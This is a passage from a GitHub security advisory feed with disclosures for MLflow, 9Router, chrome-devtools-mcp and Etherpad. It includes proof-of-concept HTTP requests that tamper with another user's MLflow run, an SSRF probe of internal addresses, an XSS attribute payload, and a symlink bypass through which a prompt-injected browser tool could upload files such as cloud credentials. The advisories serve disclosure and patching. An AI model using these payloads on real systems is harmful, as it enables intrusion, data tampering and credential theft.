<pre><code>POST /api/2.0/mlflow/runs/log-metric HTTP/1.1
Authorization: Basic YWxpY2U6YWxpY2VfcGFzc3dvcmQxMjM=   (alice:alice_password123)
Content-Type: application/json

{"run_id": "&lt;bob_run_id&gt;", "key": "test", "value": 1.0, "timestamp": 0, "step": 0}
</code></pre>
<p>Response: HTTP 403 Permission denied</p>
<ol start="2">
<li>Inject a dataset record into bob's run as alice:</li>
</ol>
<pre><code>POST /api/2.0/mlflow/runs/log-inputs HTTP/1.1
Authorization: Basic YWxpY2U6YWxpY2VfcGFzc3dvcmQxMjM=   (alice:alice_password123)
Content-Type: application/json

{"run_id": "&lt;bob_run_id&gt;", "datasets": [{"dataset": {"name": "ATTACKER_injected", "digest": "evil123", "profile": "attacker_controlled"}}]}
</code></pre>
<p>Response: HTTP 200 {}</p>
<ol start="3">
<li>Confirm injection persisted:</li>
</ol>
<pre><code>GET /api/2.0/mlflow/runs/get?run_id=&lt;bob_run_id&gt; HTTP/1.1
Authorization: Basic Ym9iOmJvYl9wYXNzd29yZF9uZXcxMjM=   (bob:bob_password_new123)
</code></pre>
<p>Response: HTTP 200 -- dataset_inputs array contains <code>{"name":"ATTACKER_injected","digest":"evil123","profile":"attacker_controlled"}</code>.</p>
<h3 id="impact">Impact</h3>
<p>Any authenticated MLflow user can corrupt the dataset lineage metadata of any other user's run. In ML compliance workflows, dataset provenance records are audit evidence for model reproducibility and regulatory review. Injecting fake or misleading dataset entries into a competitor's runs can silently invalidate audit trails, cause misattribution of model training data, or introduce confusion about which datasets were used to train a model. The attacker needs only a valid credential; no elevated permissions are required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlflow/mlflow/security/advisories/GHSA-3p64-6gvh-82v5">https://github.com/mlflow/mlflow/security/advisories/GHSA-3p64-6gvh-82v5</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/24291">https://github.com/mlflow/mlflow/pull/24291</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/5c34aec5669e2386b38b5ee0855cd61174e27693">https://github.com/mlflow/mlflow/commit/5c34aec5669e2386b38b5ee0855cd61174e27693</a></li>
<li><a href="https://github.com/mlflow/mlflow/releases/tag/v3.15.0">https://github.com/mlflow/mlflow/releases/tag/v3.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3p64-6gvh-82v5">https://github.com/advisories/GHSA-3p64-6gvh-82v5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p64-6gvh-82v5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-17T21:59:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[9router] 9Router: Authenticated Server-Side Request Forgery (SSRF) via OIDC Provider Test Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-8g4w-4ffg-8vgx</id>
        <link href="https://github.com/advisories/GHSA-8g4w-4ffg-8vgx"/>
        <updated>2026-08-17T21:58:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability exists in the 9Router dashboard via the <code>/api/auth/oidc/test</code> endpoint. The application accepts a user-controlled URL string through the <code>issuerUrl</code> parameter and performs an outbound HTTP request without validating if the destination IP belongs to a restricted internal network range.</p>
<p>Notably, this endpoint can be accessed without active session authentication (Unauthenticated), allowing any remote actor with network visibility to the dashboard API endpoints to trigger outbound infrastructure connections.</p>
<p>Depending on the state and response of the internal port targeted, this flaw exhibits two distinct behaviors:</p>
<ol>
<li><strong>Port Scanning / Blind SSRF (Non-OIDC structures):</strong> Probing internal ports that are closed or running non-HTTP/non-OIDC services (e.g., SSH, Databases) forces predictable application behavior changes (e.g., structural timeout or clear JSON parsing error messages like "Unexpected token..."), allowing internal network reconnaissance.</li>
<li><strong>Full Data Feed Manipulation (OIDC matching structures):</strong> If the targeted internal service responds with a valid OpenID configuration document structure, the backend successfully processes, parses, and reflects the internal properties back to the client, confirming partial data control.</li>
</ol>
<hr>
<h3 id="vulnerable-code-details">Vulnerable Code Details</h3>
<ul>
<li><strong>Classification:</strong> VE-Class 4 — OIDC SSRF via issuerUrl (Unauthenticated)</li>
<li><strong>File Path:</strong> <code>src/app/api/auth/oidc/test/route.js</code></li>
<li><strong>Vulnerable Logic:</strong> The endpoint accepts the parameter directly from the client request and passes it directly into the network client routine without prior sanitization or middleware authentication wrapper checks.</li>
</ul>
<pre><code class="language-javascript">// Vulnerable implementation wrapper inside the route handler
const discovery = await fetchOidcDiscovery(issuerUrl);
// Behind the scenes, this executes a direct dynamic outbound request:
// -&gt; fetch(`${issuerUrl}/.well-known/openid-configuration`)
</code></pre>
<p>An unauthenticated user can point this at any internal URL to probe internal services that respond with JSON. The discovery JSON fields (<code>token_endpoint</code>, <code>jwks_uri</code>) are then processed by the internal application logic for further operations, enabling a multi-step SSRF chain.</p>
<hr>
<h3 id="affected-endpoints">Affected Endpoints</h3>
<ul>
<li><strong>Endpoint:</strong> <code>/api/auth/oidc/test</code></li>
<li><strong>Method:</strong> <code>POST</code></li>
<li><strong>Parameter:</strong> <code>issuerUrl</code></li>
<li><strong>Impacted Feature:</strong> OIDC Authentication Configuration Test</li>
</ul>
<hr>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can abuse this behavior to use the 9Router instance as a proxy to:</p>
<ul>
<li>Conduct internal network topology discovery and port scanning against the hosting infrastructure (<code>127.0.0.1</code>, <code>10.0.0.0/8</code>, <code>192.168.0.0/16</code>).</li>
<li>Expose internal application error states or feed malicious configuration structures back into the dashboard component logic without needing prior valid session tokens.</li>
</ul>
<hr>
<h3 id="proof-of-concept--reproducing-steps">Proof of Concept &amp; Reproducing Steps</h3>
<h4 id="step-1-set-up-the-verification-environment">Step 1: Set up the Verification Environment</h4>
<p>Utilize a local mock listener on an internal port (e.g., Port 80).</p>
<p>Run the following PowerShell script with Administrative privileges to launch the mock listener:</p>
<pre><code class="language-powershell">$port = 80
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://127.0.0.1:$port/")

try {
    $listener.Start()
    Write-Host "=======================================================" -ForegroundColor Cyan
    Write-Host "  MOCK OIDC SERVER RUNNING ON PORT 80" -ForegroundColor Green
    Write-Host "=======================================================" -ForegroundColor Cyan

    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        Write-Host "[+] SSRF Request received for URL: $($request.Url)" -ForegroundColor Yellow
        
        $jsonPayload = '{"issuer":"http://127.0.0.1","authorization_endpoint":"http://127.0.0.1/oauth/auth","token_endpoint":"http://127.0.0.1/oauth/token","userinfo_endpoint":"EVIDENCE_SSRF_CONFIRMED_SUCCESSFULLY","jwks_uri":"http://127.0.0.1/oauth/keys"}'

        $response = $context.Response
        $response.StatusCode = 200
        $response.ContentType = "application/json"
        
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
        $response.Close()
        Write-Host "[*] JSON payload sent back to 9router" -ForegroundColor Green
    }
} catch {
    Write-Host "Error starting server on port 80" -ForegroundColor Red
} finally {
    if ($listener.IsListening) { $listener.Stop() }
}
</code></pre>
<h4 id="step-2-triggering-the-vulnerability-via-burp-suite">Step 2: Triggering the Vulnerability via Burp Suite</h4>
<p>Send the following raw HTTP request to the 9Router instance (Notice no Cookie header is required):</p>
<pre><code class="language-http">POST /api/auth/oidc/test HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Connection: keep-alive
Content-Length: 54

{
  "issuerUrl": "http://127.0.0.1:80",
  "clientId": "probe_only"
}
</code></pre>
<h4 id="step-3-objective-analysis-of-results">Step 3: Objective Analysis of Results</h4>
<p><strong>Scenario A: Targeting an Unmatched/Plain Text Port</strong> (e.g., Port returning raw strings like <code>"check vul"</code>)</p>
<p>The server connects to the port, receives a non-JSON response, and errors out during parsing. The application response explicitly leaks the parsing failure:</p>
<pre><code class="language-json">{"error":"Unexpected token 'c', \"check vul\" is not valid JSON"}
</code></pre>
<blockquote>
<p><strong>Analysis:</strong> This confirms the backend successfully completed an outbound TCP handshake and read the payload from the internal resource, verifying an Error-based/Blind SSRF context without any user credentials.</p>
</blockquote>
<hr>
<p><strong>Scenario B: Targeting the Valid Mock Port</strong> (Port 80 with the script active)</p>
<p>The backend connects to the mock listener, successfully fetches the fake configuration data, maps the internal endpoints, and replies with an HTTP 200 OK:</p>
<pre><code class="language-json">{
  "ok": true,
  "discoveryOk": true,
  "issuerUrl": "http://127.0.0.1:80",
  "authorizationEndpoint": "http://127.0.0.1/oauth/auth",
  "tokenEndpoint": "http://127.0.0.1/oauth/token",
  "jwksUri": "http://127.0.0.1/oauth/keys"
}
</code></pre>
<img width="1513" height="651" alt="image" src="https://github.com/user-attachments/assets/6621f418-7a0d-4660-b301-ad37468d8d7a">

<blockquote>
<p><strong>Analysis:</strong> This confirms a Full Data Feed SSRF. The internal properties parsed directly from the mock script are completely reflected back in the public client response body.</p>
</blockquote>
<hr>
<h3 id="root-cause-analysis">Root Cause Analysis</h3>
<p>The application logic handles network requests initiated by user input inside <code>/api/auth/oidc/test</code> without validating the host destination. Additionally, the route handler lacks proper authentication middleware checks to safeguard the functionality, allowing anonymous requests to safely reach internal server loops or private IP subnets.</p>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<ol>
<li><p><strong>Implement Access Control:</strong> Protect the <code>/api/auth/oidc/test</code> handler with authentication middleware to enforce valid user sessions.</p>
</li>
<li><p><strong>Enforce Protocol Controls:</strong> Validate that <code>issuerUrl</code> strictly uses the <code>https://</code> protocol scheme before performing the fetch operation.</p>
</li>
<li><p><strong>Implement Network Blocklists:</strong> Resolve the hostname within <code>issuerUrl</code> on the server-side before initiating the connection. Validate the resolved IP address and explicitly drop requests pointing to loopback addresses (<code>127.0.0.0/8</code>, <code>::1</code>) or internal private addresses (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>).</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-8g4w-4ffg-8vgx">https://github.com/decolua/9router/security/advisories/GHSA-8g4w-4ffg-8vgx</a></li>
<li><a href="https://github.com/advisories/GHSA-8g4w-4ffg-8vgx">https://github.com/advisories/GHSA-8g4w-4ffg-8vgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8g4w-4ffg-8vgx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-17T21:58:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[chrome-devtools-mcp] chrome-devtools-mcp: validatePath() does not canonicalize symlinks before enforcing roots]]></title>
        <id>https://github.com/advisories/GHSA-8qf9-62x2-82pp</id>
        <link href="https://github.com/advisories/GHSA-8qf9-62x2-82pp"/>
        <updated>2026-08-17T21:56:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>I originally reported this through Google Bug Hunters. The Google Bug Hunters team said this is in OSS VRP scope but not reward-eligible due to the project tier, and asked me to file an issue or PR directly with this repository. I am reporting it privately here first because it is an unfixed security issue.</p>
<p><code>McpContext.validatePath()</code> enforces workspace <code>roots</code> by checking whether <code>path.resolve(filePath)</code> textually falls under one of the configured root paths. <code>path.resolve()</code> does not canonicalize symbolic links. As a result, a symlink inside a configured workspace root can point to a file outside that root, pass validation, and then be followed by downstream file read/write operations.</p>
<p>This bypass applies even when the MCP client correctly declares the <code>roots</code> capability with a non-empty list. It is separate from the documented legacy behavior where missing <code>roots</code> capability allows all paths.</p>
<p>The practical impact is a workspace-boundary bypass. In the write direction, filePath-writing tools can overwrite out-of-root files through an in-root symlink. In the read direction, <code>upload_file</code> can read through the symlink and send the file to the currently selected web page.</p>
<h3 id="details">Details</h3>
<p>Affected code:</p>
<p><code>src/McpContext.ts:178-199</code></p>
<pre><code class="language-ts">validatePath(filePath?: string): void {
  if (filePath === undefined) {
    return;
  }
  const roots = this.roots();
  if (roots === undefined) {
    return;
  }
  const absolutePath = path.resolve(filePath);
  for (const root of roots) {
    const rootPath = path.resolve(fileURLToPath(root.uri));
    if (
      absolutePath === rootPath ||
      absolutePath.startsWith(rootPath + path.sep)
    ) {
      return;
    }
  }
  throw new Error(
    `Access denied: path ${filePath} is not within any of the workspace roots ${JSON.stringify(roots)}.`,
  );
}
</code></pre>
<p><code>path.resolve()</code> only normalizes path text such as <code>.</code> and <code>..</code>. It does not call <code>realpath()</code> and does not resolve symlinks. Therefore, a path like:</p>
<pre><code class="language-text">/workspace/project/cache/profile
</code></pre>
<p>can textually pass the <code>/workspace</code> prefix check even when <code>cache/profile</code> is a symlink to:</p>
<pre><code class="language-text">/home/user/.aws/credentials
</code></pre>
<p>Downstream consumers then perform real filesystem operations without <code>O_NOFOLLOW</code>:</p>
<ul>
<li><code>src/McpContext.ts:720-738</code> <code>saveFile()</code> uses <code>fs.mkdir({recursive: true})</code> and <code>fs.writeFile()</code>.</li>
<li><code>src/tools/input.ts:454-497</code> <code>upload_file</code> calls <code>puppeteer.uploadFile(filePath)</code> or <code>fileChooser.accept([filePath])</code>.</li>
<li>Other filePath-writing tools include screenshots, heap snapshots, network response save paths, snapshots, screencasts, Lighthouse output, and performance trace saves.</li>
</ul>
<p>This is not a TOCTOU/race condition. The symlink exists before validation and the PoC uses a single process. The issue is a canonicalization bypass / improper link resolution.</p>
<p>Preconditions:</p>
<ul>
<li>The MCP client declares <code>roots</code> and supplies at least one workspace root.</li>
<li>A symlink exists inside the workspace and points outside the workspace.</li>
<li>For the remote prompt-injection chain, the user processes untrusted page content while chrome-devtools-mcp is connected.</li>
</ul>
<p>A remote attacker does not need local access if a suitable workspace-internal symlink already exists, or if another trusted tool/workflow can create it. Without such a symlink, the issue is a local/workspace-state-dependent boundary bypass.</p>
<h3 id="poc">PoC</h3>
<p>Conceptual exploitation with a configured root:</p>
<pre><code class="language-text">Configured roots:
  file:///workspace

Workspace path:
  /workspace/project/cache/profile -&gt; /home/user/.aws/credentials

Tool call:
  upload_file({
    filePath: "/workspace/project/cache/profile",
    uid: "&lt;file input element on current page&gt;"
  })

Result:
  validatePath() accepts the path because it textually starts with /workspace.
  Puppeteer follows the symlink and uploads the target file to the page.
</code></pre>
<p>Lab-only PoC that replicates the exact validation logic and subsequent write. It writes only inside a fresh temporary directory and touches no system paths:</p>
<pre><code class="language-js">const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');
const {pathToFileURL, fileURLToPath} = require('node:url');

const lab = fs.mkdtempSync(path.join(os.tmpdir(), 'cdtmcp-lab-'));

try {
  fs.chmodSync(lab, 0o755);

  const workspace = path.join(lab, 'workspace');
  fs.mkdirSync(workspace);

  const outside = path.join(lab, 'outside-secret.txt');
  fs.writeFileSync(outside, 'sensitive outside content\n');

  const symlinkInside = path.join(workspace, 'innocent.txt');
  fs.symlinkSync(outside, symlinkInside);

  function validatePath(filePath, roots) {
    const absolutePath = path.resolve(filePath);
    for (const root of roots) {
      const rootPath = path.resolve(fileURLToPath(root.uri));
      if (
        absolutePath === rootPath ||
        absolutePath.startsWith(rootPath + path.sep)
      ) {
        return true;
      }
    }
    throw new Error(`Access denied: ${filePath}`);
  }

  const roots = [{uri: pathToFileURL(workspace).href, name: 'workspace'}];
  validatePath(symlinkInside, roots);

  fs.writeFileSync(symlinkInside, 'OVERWRITTEN BY MCP\n');

  console.log(fs.readFileSync(outside, 'utf8'));
  // -&gt; "OVERWRITTEN BY MCP"
} finally {
  fs.rmSync(lab, {recursive: true, force: true});
}
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">validatePath() accepts the in-root symlink path.
The subsequent write follows the symlink and modifies the out-of-root target.
</code></pre>
<p>I can provide an end-to-end MCP client reproduction if needed. The lab PoC above demonstrates the root cause using the same validation logic as the server.</p>
<h3 id="impact">Impact</h3>
<p>Who can exploit:</p>
<ul>
<li>A local process/user or trusted workflow that can create a symlink inside the workspace.</li>
<li>A remote page/prompt-injection attacker, if a suitable workspace-internal symlink already exists or can be created by another trusted workflow/tool.</li>
</ul>
<p>Security impact:</p>
<ul>
<li>Integrity: tools that write to <code>filePath</code> can overwrite files outside the configured workspace root through an in-root symlink.</li>
<li>Confidentiality: <code>upload_file</code> can read a file outside the workspace through an in-root symlink and attach it to a file input on the current page.</li>
<li>Stealth/auditability: the exfiltration path goes through normal page file-upload behavior, and chrome-devtools-mcp does not appear to log the canonical path that was uploaded.</li>
</ul>
<p>Example sensitive files reachable if symlinked into the workspace:</p>
<ul>
<li>Cloud credentials such as <code>~/.aws/credentials</code>, <code>~/.config/gcloud/...</code>, or <code>~/.azure/...</code>.</li>
<li>SSH private keys or <code>.ssh</code> files readable by the user.</li>
<li>Project secrets such as <code>.env</code>, <code>.npmrc</code>, <code>.netrc</code>, <code>secrets.json</code>, and API tokens.</li>
<li>Out-of-workspace source files or configuration files.</li>
</ul>
<p>Severity:</p>
<ul>
<li>Suggested GitHub severity: Moderate.</li>
<li>CVSS v3.1 chain estimate: <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code>.</li>
<li>AC:H reflects that a workspace-internal symlink must exist at validation time.</li>
</ul>
<p>Suggested fix:</p>
<p>Canonicalize paths before comparing against roots. For an existing file, use <code>fs.realpath()</code> on the path. For a new file, resolve the parent directory with <code>fs.realpath()</code> and re-join the basename.</p>
<pre><code class="language-ts">async validatePath(filePath?: string): Promise&lt;void&gt; {
  if (filePath === undefined) return;
  const roots = this.roots();
  if (roots === undefined) return;

  const abs = path.resolve(filePath);
  let canonical;
  try {
    canonical = await fs.realpath(abs);
  } catch (err) {
    if (err.code === 'ENOENT') {
      const parent = await fs.realpath(path.dirname(abs));
      canonical = path.join(parent, path.basename(abs));
    } else {
      throw err;
    }
  }

  for (const root of roots) {
    const canonicalRoot = await fs.realpath(fileURLToPath(root.uri));
    if (
      canonical === canonicalRoot ||
      canonical.startsWith(canonicalRoot + path.sep)
    ) {
      return;
    }
  }

  throw new Error(
    `Access denied: ${filePath} (canonical: ${canonical}) is not within any workspace root.`,
  );
}
### References

- &lt;https://github.com/ChromeDevTools/chrome-devtools-mcp/security/advisories/GHSA-8qf9-62x2-82pp&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-53766&gt;
- &lt;https://github.com/ChromeDevTools/chrome-devtools-mcp/pull/2127&gt;
- &lt;https://github.com/ChromeDevTools/chrome-devtools-mcp/commit/176eb695137d9c46a61e2d4d5571880c5145cf46&gt;
- &lt;https://github.com/ChromeDevTools/chrome-devtools-mcp/releases/tag/chrome-devtools-mcp-v1.1.0&gt;
- &lt;https://github.com/advisories/GHSA-8qf9-62x2-82pp&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qf9-62x2-82pp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-17T21:56:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ep_etherpad-lite] Etherpad has stored XSS in HTML export via unescaped attribute-pool values]]></title>
        <id>https://github.com/advisories/GHSA-2jp7-wwpg-3p9w</id>
        <link href="https://github.com/advisories/GHSA-2jp7-wwpg-3p9w"/>
        <updated>2026-08-17T17:49:39.000Z</updated>
        <content type="html"><![CDATA[<p>Fix: PR #7905 (ether/etherpad).</p>
<p><code>getHTMLFromAtext</code> in <code>src/node/utils/ExportHtml.ts</code> interpolates values from the <code>exportHtmlAdditionalTagsWithData</code> plugin hook into <code>span data-&lt;k&gt;="&lt;v&gt;"</code> without HTML-attribute escaping. The value comes verbatim from the pad attribute pool, which a pad editor controls via a crafted changeset (only <code>author</code> attributes are validated; <code>moveOpsToNewPool</code> -&gt; <code>AttributePool.putAttrib</code> stores any value). With a bundled plugin that registers the hook (ep_font_color / ep_font_size), an attribute value such as <code>" onload="alert(1)</code> is exported as <code>&lt;span data-color="" onload="alert(1)"&gt;</code> and served as text/html, yielding stored XSS for any collaborator who opens the export.</p>
<p>Fix: escape the name and value via <code>Security.escapeHTMLAttribute</code>. PR #7905 also adds a startup warning when default/placeholder account or SSO credentials are configured (defense-in-depth, non-breaking).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ether/etherpad/security/advisories/GHSA-2jp7-wwpg-3p9w">https://github.com/ether/etherpad/security/advisories/GHSA-2jp7-wwpg-3p9w</a></li>
<li><a href="https://github.com/ether/etherpad/pull/7905">https://github.com/ether/etherpad/pull/7905</a></li>
<li><a href="https://github.com/ether/etherpad/commit/86c56cf827dd6e5ff1b6cd3760f87adc47f58bb1">https://github.com/ether/etherpad/commit/86c56cf827dd6e5ff1b6cd3760f87adc47f58bb1</a></li>
<li><a href="https://github.com/ether/etherpad/releases/tag/3.3.0">https://github.com/ether/etherpad/releases/tag/3.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2jp7-wwpg-3p9w">https://github.com/advisories/GHSA-2jp7-wwpg-3p9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jp7-wwpg-3p9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-17T17:49:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ep_etherpad-lite] Etherpad addressed weak token RNG, login timing, plugin path handling, API request handling]]></title>
        <id>https://github.com/advisories/GHSA-92hr-gmr6-h8cp</id>
        <link href="https://github.com/advisories/GHSA-92hr-gmr6-h8cp"/>
        <updated>2026-08-17T17:49:22.000Z</updated>
        <content type="html"><![CDATA[<p>Fix: PR #7906 (ether/etherpad). A set of medium/low hardening fixes:</p>
<ul>
<li><strong>Weak RNG for tokens (CWE-330):</strong> author/session/readonly IDs were generated with <code>Math.random()</code> (client and server). Now use <code>crypto.getRandomValues</code>.</li>
<li><strong>Login timing / no failure delay (CWE-208/CWE-307):</strong> the OIDC interaction login used a non-constant-time password compare with no failure delay. Now uses <code>crypto.timingSafeEqual</code> plus a uniform failure delay; user lookup is own-property only.</li>
<li><strong>Plugin dependency path handling (CWE-22):</strong> plugin dependency names from package.json were used to build filesystem paths without validation (admin-gated install). Now validated against the npm name grammar.</li>
<li><strong>API parameter pollution (CWE-235):</strong> <code>/api/2</code> merged all request headers into the API field set. Now forwards only <code>authorization</code>, matching the openapi.ts handler.</li>
<li><strong>Pad-creation side effect:</strong> <code>API.appendChatMessage</code> could create arbitrary pads (missing <code>getPadSafe</code>). Now requires the pad to exist.</li>
<li><strong>Error info disclosure (CWE-209):</strong> the admin file server echoed filesystem error detail; now returns a generic message.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ether/etherpad/security/advisories/GHSA-92hr-gmr6-h8cp">https://github.com/ether/etherpad/security/advisories/GHSA-92hr-gmr6-h8cp</a></li>
<li><a href="https://github.com/ether/etherpad/pull/7906">https://github.com/ether/etherpad/pull/7906</a></li>
<li><a href="https://github.com/ether/etherpad/commit/7ea99706483443239bbbc0f2df9aff8ab5de4805">https://github.com/ether/etherpad/commit/7ea99706483443239bbbc0f2df9aff8ab5de4805</a></li>
<li><a href="https://github.com/ether/etherpad/releases/tag/3.3.0">https://github.com/ether/etherpad/releases/tag/3.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-92hr-gmr6-h8cp">https://github.com/advisories/GHSA-92hr-gmr6-h8cp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92hr-gmr6-h8cp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-17T17:49:21.000Z</published>
    </entry>
</feed>